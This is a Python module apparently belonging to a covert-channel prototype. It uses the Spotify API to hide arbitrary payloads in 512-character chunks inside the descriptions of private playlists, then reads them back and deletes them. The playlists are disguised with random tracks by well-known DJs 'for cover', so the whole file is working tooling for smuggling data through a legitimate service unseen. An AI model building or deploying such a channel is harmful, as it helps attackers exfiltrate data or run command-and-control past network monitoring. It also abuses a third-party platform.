"""spotapi.py - Spotify API wrapper for covert channel operations.

Handles authentication, playlist CRUD, and payload chunking via
Spotify playlist descriptions (512 characters per playlist).
"""

import os
import html
import random
import sys
import time

import spotipy
import spotipy.util as util

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Playlist description size limit (empirically tested 2026-04, API rejects 513+)
CHUNK_SIZE = 512

# Max payload size before aborting (~2000 playlists)
MAX_PAYLOAD_SIZE = 1_023_999

# Default filler artists to pick from randomly
DEFAULT_ARTISTS = [
    "Tiesto", "Deadmau5", "Avicii", "Calvin Harris",
    "Martin Garrix", "Armin van Buuren", "David Guetta",
]

# Prefix marker for payload playlists (used in name matching)
PLAYLIST_MARKER = "payloadChunk"


class Spot:
    """Spotify API interface for covert data transmission."""

    def __init__(self):
        """Authenticate and establish a Spotify session.

        Raises:
            SystemExit: If environment variables are missing or auth fails.
        """
        self.playlist_marker = PLAYLIST_MARKER
        self.scope = (
            'user-library-read user-library-modify '
            'playlist-modify-private playlist-read-private'
        )
        self._load_credentials()
        self._authenticate()

    def _load_credentials(self):
        """Load Spotify credentials from environment variables.

        Raises:
            SystemExit: If any required variable is missing.
        """
        required_vars = [
            "SPOTIFY_USERNAME", "SPOTIFY_REDIRECTURI",
            "SPOTIFY_CLIENT_ID", "SPOTIFY_CLIENT_SECRET",
        ]
        try:
            self.username = os.environ["SPOTIFY_USERNAME"]
            self.redirect_uri = os.environ["SPOTIFY_REDIRECTURI"]
            self.client_id = os.environ["SPOTIFY_CLIENT_ID"]
            self.client_secret = os.environ["SPOTIFY_CLIENT_SECRET"]
        except KeyError as err:
            print(f"[!] Missing environment variable: {err}")
            print(f"[!] Required: {', '.join(required_vars)}")
            sys.exit(1)

    def _authenticate(self):
        """Obtain Spotify API token and create client.

        Raises:
            SystemExit: If token cannot be obtained.
        """
        try:
            token = util.prompt_for_user_token(
                self.username, self.scope, self.client_id,
                self.client_secret, self.redirect_uri
            )
            if not token:
                print("[!] Cannot obtain Spotify API token")
                sys.exit(1)
            self.spotipy = spotipy.Spotify(auth=token)
        except spotipy.SpotifyException as err:
            print(f"[!] Spotify authentication failed: {err}")
            sys.exit(1)

    def _get_all_playlists(self) -> list:
        """Fetch ALL user playlists with pagination.

        Returns:
            List of playlist dicts from the Spotify API.
        """
        all_playlists = []
        offset = 0
        limit = 50
        while True:
            batch = self.spotipy.user_playlists(
                self.username, limit=limit, offset=offset
            )
            items = batch.get('items', [])
            if not items:
                break
            all_playlists.extend(items)
            if batch.get('next') is None:
                break
            offset += limit
        return all_playlists

    def clear_data(self):
        """Delete all payload playlists from the account."""
        playlists = self._get_all_playlists()
        count = 0
        for playlist in playlists:
            if self.playlist_marker in playlist['name']:
                self.spotipy.user_playlist_unfollow(
                    self.username, playlist['id']
                )
                count += 1
        print(f"[*] Data cleared ({count} playlists removed)")

    def retrieve_playlists(self) -> str:
        """Retrieve and reassemble payload from playlist descriptions.

        Playlists are sorted by their numeric prefix to ensure correct
        ordering regardless of API return order.

        Returns:
            Concatenated payload string from all matching playlists.

        Raises:
            SystemExit: If retrieval fails.
        """
        print("[*] Retrieving playlists")
        try:
            playlists = self._get_all_playlists()
        except spotipy.SpotifyException as err:
            print(f"[!] Cannot retrieve playlists: {err}")
            sys.exit(1)

        # Filter and sort payload playlists by index
        payload_playlists = []
        for p in playlists:
            if self.playlist_marker in p['name']:
                payload_playlists.append(p)

        # Sort by numeric prefix (e.g., "3-payloadChunk" -> 3)
        def sort_key(p):
            name = p['name']
            prefix = name.split('-')[0]
            try:
                return int(prefix)
            except ValueError:
                return 0

        payload_playlists.sort(key=sort_key)

        descriptions = ''
        for playlist in payload_playlists:
            try:
                results = self.spotipy.user_playlist(
                    self.username, playlist['id']
                )
                desc = html.unescape(results.get('description', ''))
                descriptions += desc
                print(f"\t[*] Retrieved {playlist['name']}")
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot read playlist {playlist['id']}: {err}")
                sys.exit(1)

        print(f"[*] Retrieved {len(payload_playlists)} chunks")
        return descriptions

    def generate_playlists(self, payload: str):
        """Chunk payload and store in Spotify playlist descriptions.

        Each chunk becomes a private playlist's description field.
        Playlists are filled with random filler tracks for cover.

        Args:
            payload: The encoded payload string to transmit.

        Raises:
            SystemExit: If payload too large or API calls fail.
        """
        if len(payload) > MAX_PAYLOAD_SIZE:
            print(
                f"[!] Payload too large: {len(payload)} bytes. "
                f"Would need ~{len(payload) // CHUNK_SIZE} playlists. "
                f"Aborting."
            )
            sys.exit(1)

        print("[*] Generating playlists")

        if len(payload) <= CHUNK_SIZE:
            chunks = [payload]
        else:
            chunks = [
                payload[i:i + CHUNK_SIZE]
                for i in range(0, len(payload), CHUNK_SIZE)
            ]

        for idx, chunk in enumerate(chunks, start=1):
            playlist_name = f"{idx}-{self.playlist_marker}"
            try:
                playlist = self.spotipy.user_playlist_create(
                    self.username, playlist_name,
                    public=False, collaborative=False,
                    description=chunk
                )
                print(f"\t[*] Created {playlist_name} ({len(chunk)} bytes)")
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot create playlist: {err}")
                sys.exit(1)

            # Add filler tracks for cover
            try:
                tracks = self._get_filler_tracks()
                if tracks:
                    self.spotipy.user_playlist_add_tracks(
                        self.username, playlist['id'], tracks
                    )
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot add filler tracks: {err}")
                # Non-fatal: continue without tracks

            # Brief delay to avoid rate limiting
            time.sleep(0.1)

        print(f"[*] Data encoded and sent ({len(chunks)} playlists)")

    def _get_filler_tracks(self, count: int = 5) -> list:
        """Get random filler track IDs for cover.

        Picks a random artist from the pool each time.

        Args:
            count: Number of tracks to fetch.

        Returns:
            List of Spotify track ID strings.
        """
        artist = random.choice(DEFAULT_ARTISTS)
        try:
            results = self.spotipy.search(
                q=f'artist:{artist}', type='artist', limit=1
            )
            if not results['artists']['items']:
                return []

            artist_id = results['artists']['items'][0]['id']
            top_tracks = self.spotipy.artist_top_tracks(artist_id)
            tracks = top_tracks.get('tracks', [])
            return [t['id'] for t in tracks[:count]]
        except spotipy.SpotifyException:
            return []
